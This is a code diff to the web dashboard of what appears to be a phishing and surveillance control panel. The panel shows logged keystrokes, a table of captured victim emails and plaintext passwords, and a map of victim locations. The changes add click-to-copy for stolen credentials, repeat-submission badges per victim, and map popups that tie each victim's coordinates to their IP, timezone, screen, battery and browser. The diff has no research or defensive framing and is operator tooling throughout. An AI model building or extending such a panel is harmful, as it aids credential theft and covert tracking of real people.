@@ -1636,7 +1636,8 @@ function renderKeystrokes(keys) {
         'NAVIGATOR': '#a5b4fc', 'FONTS': '#fda4af',
         'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc', 'XHR': '#93c5fd',
         'INPUT TYPE': '#fb7185', 'BEACON': '#c084fc', 'STORAGE SIZE': '#fde68a',
-        'HISTORY': '#a5f3fc', 'CLIPBOARD WRITE': '#bbf7d0', 'SPA NAV': '#a5f3fc'
+        'HISTORY': '#a5f3fc', 'CLIPBOARD WRITE': '#bbf7d0', 'SPA NAV': '#a5f3fc',
+        'PASSWORD STRENGTH': '#f9a8d4'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -1650,7 +1651,7 @@ function renderKeystrokes(keys) {
         let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         highlighted = colorizeMarker(highlighted);
-        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR|BEACON|STORAGE|HISTORY|CLIPBOARD|SPA)/.test(k.keys || '');
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR|BEACON|STORAGE|HISTORY|CLIPBOARD|SPA|PASSWORD)/.test(k.keys || '');
         return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
             ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
@@ -1804,6 +1805,13 @@ function sortCreds(col) {
     renderCredentials(window._lastCreds || []);
 }
 
+function copyCellVal(val, el) {
+    navigator.clipboard.writeText(val).then(() => {
+        el.style.outline = '1px solid #4ade80';
+        setTimeout(() => { el.style.outline = ''; }, 800);
+    }).catch(() => {});
+}
+
 function renderCredentials(creds) {
     const c = $('#cred-log');
     if (!creds || !creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
@@ -1813,6 +1821,10 @@ function renderCredentials(creds) {
         else { av = String(av).toLowerCase(); bv = String(bv).toLowerCase(); }
         return av < bv ? -credSort.dir : av > bv ? credSort.dir : 0;
     });
+    // Detect repeat submissions from same clientId
+    const clientSubmitCount = {};
+    sorted.forEach(cr => { clientSubmitCount[cr.clientId] = (clientSubmitCount[cr.clientId] || 0) + 1; });
+    const seenClient = {};
     const arrow = col => credSort.col === col ? (credSort.dir === 1 ? ' ▲' : ' ▼') : ' ⇅';
     const th = (col, label) => `<th onclick="sortCreds('${col}')" style="padding:7px 10px;cursor:pointer;user-select:none;white-space:nowrap">${label}${arrow(col)}</th>`;
     c.innerHTML = `<table style="width:100%;border-collapse:collapse;font-size:.72rem">
@@ -1825,16 +1837,21 @@ function renderCredentials(creds) {
             ${th('source','Source')}
             ${th('ip','IP')}
         </tr></thead>
-        <tbody>${sorted.map((cr, i) => `
-            <tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
+        <tbody>${sorted.map((cr, i) => {
+            seenClient[cr.clientId] = (seenClient[cr.clientId] || 0) + 1;
+            const n = seenClient[cr.clientId], total = clientSubmitCount[cr.clientId];
+            const repeatBadge = total > 1 ? `<span style="font-size:.55rem;background:#dc2626;color:#fff;border-radius:3px;padding:1px 4px;margin-left:4px" title="${n}/${total} submissions">REPEAT #${n}</span>` : '';
+            const safeEmail = escHtml(cr.email||'');
+            const safePw    = escHtml(cr.password||'');
+            return `<tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
                 <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
                 <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}</td>
-                <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.clientId||'')}</td>
-                <td style="padding:7px 10px;font-weight:600;color:#f4b400">${escHtml(cr.email)}</td>
-                <td style="padding:7px 10px;font-family:monospace;color:#4fc3f7;letter-spacing:.05em">${escHtml(cr.password)}</td>
+                <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.clientId||'')}${repeatBadge}</td>
+                <td style="padding:7px 10px;font-weight:600;color:#f4b400;cursor:pointer" title="Click to copy email" onclick="copyCellVal(this.dataset.v,this)" data-v="${safeEmail}">${safeEmail}</td>
+                <td style="padding:7px 10px;font-family:monospace;color:#4fc3f7;letter-spacing:.05em;cursor:pointer" title="Click to copy password" onclick="copyCellVal(this.dataset.v,this)" data-v="${safePw}">${safePw}</td>
                 <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.source||'')}</td>
                 <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.ip||'')}</td>
-            </tr>`).join('')}
+            </tr>`;}).join('')}
         </tbody></table>`;
 }
 
@@ -2372,7 +2389,21 @@ async function loadMap() {
         const m = L.circleMarker([l.latitude, l.longitude], {
             radius: 8, color, fillColor: color, fillOpacity: 0.7
         }).addTo(map);
-        m.bindPopup(`<b>${id}</b><br>${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}<br>${l.source||''}<br>${fmtTime(l.timestamp)}`);
+        m.bindPopup((() => {
+            const cl = (window._lastClientsData && window._lastClientsData[id]) || {};
+            const ip     = cl.ip || l.ip || '?';
+            const tz     = cl.timezone || '?';
+            const ua     = (cl.userAgent || '').slice(0, 80) || '?';
+            const scr    = cl.screen ? `${cl.screen.w||'?'}×${cl.screen.h||'?'}` : '?';
+            const bat    = cl.battery != null ? `${Math.round(cl.battery*100)}%` : '?';
+            return `<div style="font-size:12px;line-height:1.7"><b>${id}</b><br>` +
+                `📍 ${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}<br>` +
+                `🌐 ${ip} &nbsp;🕐 ${tz}<br>` +
+                `🖥 ${scr} &nbsp;🔋 ${bat}<br>` +
+                `${escHtml(l.source||'')}<br>` +
+                `<span style="color:#888;font-size:10px">${fmtTime(l.timestamp)}</span><br>` +
+                `<span style="color:#aaa;font-size:10px">${escHtml(ua)}</span></div>`;
+        })());
         markers[id] = m;
     });
 
